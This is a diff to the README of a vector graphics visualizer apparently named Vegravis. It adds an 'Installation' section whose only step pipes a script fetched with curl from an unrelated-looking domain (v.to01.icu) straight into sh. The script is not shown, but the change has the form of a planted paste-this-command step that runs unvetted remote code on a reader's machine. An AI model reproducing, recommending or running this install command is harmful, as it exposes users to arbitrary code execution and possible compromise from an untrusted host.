@@ -21,6 +21,12 @@
 <img src="snapshots/snapshot.png" alt="Snapshot">
 <img src="snapshots/snapshot_with_tr.png" alt="Snapshot With TransformResolver">
 
+## Installation
+
+```sh
+curl -fsSL https://v.to01.icu/install.sh | sh
+```
+
 ## Introduction
 
 Vegravis is a vector graphics visualizer.
